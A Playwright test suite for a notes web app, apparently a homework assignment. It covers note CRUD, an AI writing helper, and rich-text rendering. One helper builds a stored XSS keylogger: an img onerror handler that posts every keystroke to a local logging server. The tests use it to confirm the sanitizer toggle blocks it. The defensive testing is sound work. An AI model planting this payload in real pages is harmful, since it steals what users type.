import { test, expect, type Page } from '@playwright/test';
import fs from 'fs';
import path from 'path';

const BACKEND_URL = 'http://127.0.0.1:3001';

type TestUser = {
  name: string;
  email: string;
  username: string;
  password: string;
};

function uniqueContent() {
  return `playwright-test-note-${Date.now()}-${Math.floor(Math.random() * 10000)}`;
}

function uniqueUser(): TestUser {
  const unique = `${Date.now()}-${Math.floor(Math.random() * 10000)}`;

  return {
    name: 'Playwright User',
    email: `playwright-${unique}@example.com`,
    username: `playwright-${unique}`,
    password: '123456',
  };
}

function keylogPath() {
  const cwd = process.cwd();
  if (path.basename(cwd) === 'frontend') {
    return path.resolve(cwd, '..', 'keylog.txt');
  }
  return path.resolve(cwd, 'keylog.txt');
}

function resetKeylog() {
  try {
    fs.writeFileSync(keylogPath(), '', 'utf8');
  } catch (e) {
    // מונע קריסה אם הקובץ זמנית נעול
  }
}

function readKeylog() {
  const filePath = keylogPath();
  if (!fs.existsSync(filePath)) {
    return '';
  }
  return fs.readFileSync(filePath, 'utf8');
}

async function createUserThroughApi(page: Page, user: TestUser) {
  const response = await page.request.post(`${BACKEND_URL}/users`, {
    data: user,
  });
  expect(response.status()).toBe(201);
}

async function loginThroughUi(page: Page, user: TestUser) {
  await page.goto('/login');
  await page.getByTestId('login_form_username').fill(user.username);
  await page.getByTestId('login_form_password').fill(user.password);
  await page.getByTestId('login_form_login').click();
  await expect(page).toHaveURL('/');
  await expect(page.getByTestId('logout')).toBeVisible();
}

async function createLoggedInUser(page: Page) {
  const user = uniqueUser();
  await createUserThroughApi(page, user);
  await loginThroughUi(page, user);
  return user;
}

function newNoteInput(page: Page) {
  return page
    .locator('input[name="text_input_new_note"], textarea[name="text_input_new_note"]')
    .first();
}

async function createNote(page: Page, content: string, expectedVisibleText = content) {
  await page.locator('button[name="add_new_note"]').click();
  const input = newNoteInput(page);
  await expect(input).toBeVisible();
  await input.fill(content);
  await page.locator('button[name="text_input_save_new_note"]').click();
  await expect(page.locator('.notification')).toHaveText('Added a new note');
  const note = page.locator('.note').filter({ hasText: expectedVisibleText }).first();
  await expect(note).toBeVisible();
  return note;
}

function keyloggerPayload(marker: string) {
  return `${marker} hello <img src=x onerror="document.addEventListener('keydown', function(e) { fetch('http://127.0.0.1:4000/log', { method: 'POST', body: e.key }); })"> world`;
}

async function typeKeysOnPage(page: Page, keys: string) {
  await page.locator('body').click();
  await page.keyboard.type(keys);
}

test.describe.configure({ mode: 'serial' });

test.beforeEach(async ({ page }) => {
  resetKeylog();
  await createLoggedInUser(page);
});

test('READ: displays notes page with up to 10 notes', async ({ page }) => {
  await expect(page.locator('h1')).toHaveText('Notes');
  const notes = page.locator('.note');
  const count = await notes.count();
  expect(count).toBeLessThanOrEqual(10);
  if (count > 0) {
    await expect(notes.first()).toBeVisible();
  }
});

test('CREATE: creates a new note', async ({ page }) => {
  const content = uniqueContent();
  await createNote(page, content);
  const notesCount = await page.locator('.note').count();
  expect(notesCount).toBeLessThanOrEqual(10);
});

test('UPDATE: edits an existing note', async ({ page }) => {
  const originalContent = uniqueContent();
  const updatedContent = `${originalContent}-updated`;
  const note = await createNote(page, originalContent);
  const noteId = await note.getAttribute('data-testid');
  expect(noteId).not.toBeNull();
  await page.getByTestId(`edit-${noteId}`).click();
  const textInput = page.getByTestId(`text_input-${noteId}`);
  await expect(textInput).toBeVisible();
  await textInput.fill(updatedContent);
  await page.getByTestId(`text_input_save-${noteId}`).click();
  await expect(page.locator('.notification')).toHaveText('Note updated');
  await expect(page.locator('.note').filter({ hasText: updatedContent }).first()).toBeVisible();
});

test('DELETE: deletes an existing note', async ({ page }) => {
  const content = uniqueContent();
  const note = await createNote(page, content);
  const noteId = await note.getAttribute('data-testid');
  expect(noteId).not.toBeNull();
  await page.getByTestId(`delete-${noteId}`).click();
  await expect(page.locator('.notification')).toHaveText('Note deleted');
  await expect(page.locator('.note').filter({ hasText: content })).toHaveCount(0);
});

test('AI assistant: appends generated text to the new-note input', async ({ page }) => {
  await page.locator('button[name="add_new_note"]').click();
  const input = newNoteInput(page);
  await expect(input).toBeVisible();
  const before = await input.inputValue();
  await page.getByTestId('help_me_write').click();
  await page
    .getByTestId('help_me_write_prompt')
    .fill('Write a short note about studying React');
  await page.getByTestId('help_me_write_submit').click();
  await expect
    .poll(
      async () => {
        const after = await input.inputValue();
        return after.trim().length > 0 && after.length > before.length;
      },
      { timeout: 120000 }
    )
    .toBe(true);
});

test('HW4: renders rich-text HTML inside note body', async ({ page }) => {
  const marker = uniqueContent();
  const note = await createNote(page, `${marker} Hello <b>world</b>`, marker);
  const noteBody = note.getByTestId('note_body');
  await expect(noteBody).toBeVisible();
  await expect(noteBody.locator('b')).toHaveText('world');
});

test('HW4: keylogger payload works when sanitizer is OFF', async ({ page }) => {
  const toggle = page.getByTestId('sanitizer_toggle');
  await expect(toggle).toHaveText('Sanitizer: ON');
  await toggle.click();
  await expect(toggle).toHaveText('Sanitizer: OFF');

  const marker = uniqueContent();
  await createNote(page, keyloggerPayload(marker), marker);
  await typeKeysOnPage(page, 'abc');

  await expect
    .poll(() => readKeylog(), { timeout: 5000 })
    .toMatch(/[aA].*[bB].*[cC]/s);
});

test('HW4: keylogger payload is blocked when sanitizer is ON', async ({ page }) => {
  const toggle = page.getByTestId('sanitizer_toggle');
  await expect(toggle).toHaveText('Sanitizer: ON');

  const marker = uniqueContent();
  await createNote(page, keyloggerPayload(marker), marker);
  await typeKeysOnPage(page, 'abc');

  await page.waitForFunction(() => true); 
  await new Promise(res => setTimeout(res, 1000));

  expect(readKeylog().trim()).toBe('');
});